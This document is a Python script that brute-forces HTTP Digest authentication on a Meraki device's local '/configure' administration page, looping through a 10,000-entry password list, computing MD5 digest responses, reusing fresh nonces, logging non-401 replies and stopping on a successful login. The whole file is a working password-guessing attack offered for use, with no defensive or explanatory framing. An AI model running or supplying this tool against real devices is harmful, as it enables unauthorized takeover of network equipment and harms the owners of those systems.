import hashlib
import requests
import secrets


# proud of this one
def md5(*args):
    string = ':'.join(str(x) for x in args)
    return hashlib.md5(string.encode()).hexdigest()


def log(request, password, counter):
    print(f'\n\n Status {request.status_code} detected: used \"{password}\" and counter at {counter}')
    # writes results to a file
    with open('results.txt', 'a') as results:
        results.write(f'Password: {password}\nCounter: {counter}\nStatus: {request.status_code}\n\n')
        # only ends on a 2xx sucessful auth
    if 200 <= request.status_code < 300:
        print('Exiting')
        exit()


def hashes(user, realm, password, method, uri, nonce, cnonce, qop):
    h1 = md5(user, realm, password)
    h2 = md5(method, uri)
    response = md5(h1, nonce, '00000001', cnonce, qop, h2)
    return response


def main():
    # manual progress tracking, I know
    total = 0

    url = 'http://172.16.1.1/configure'
    # testurl = 'https://jigsaw.w3.org/HTTP/Digest/'

    # customizable, don't know how to read headers and extract these on the fly because they're not json or dictionaries
    user = 'admin'
    realm = 'Meraki Manual Configuration. The login is \'admin\' and the password has been administratively configured on ' \
            'Meraki Dashboard. '
    uri = '/configure'
    method = 'HEAD'
    qop = 'auth'
    filename = '10k.txt'

    # get a new nonce to start the chain
    # idk how to get this via comprehension, this is a problem with realm and qop too, and leads to the unsightly slicing
    r = requests.head(url)
    nonce = r.headers['WWW-Authenticate'][180:-13]

    with open(filename) as file:
        passwords = [line.rstrip() for line in file]
    print(len(passwords), 'passwords loaded')

    if total > len(passwords):
        print('Total is greater then amount of passwords, please change')
        exit()

    for i in range(total, len(passwords)):
        cnonce = secrets.token_hex(8)
        response = hashes(user, realm, passwords[i], method, uri, nonce, cnonce, qop)
        header = {
            'Authorization': f'Digest username="{user}", realm="{realm}", nonce="{nonce}", uri="{uri}", algorithm=MD5, response="{response}", qop=auth, nc="00000001", cnonce="{cnonce}" '
        }
        request = requests.head(url, headers=header)

        # triggers on status codes other than 200 but i'd want to know about those, too
        if request.status_code != 401:
            log(request, passwords[i], i)

        nonce = request.headers['WWW-Authenticate'][180:-13]

        if i % 100 == 0:
            print(i, end=', ')
        # print(i, passwords[i], reqest.status_code)

    print('Ç\'est la fin')


if __name__ == '__main__':
    main()
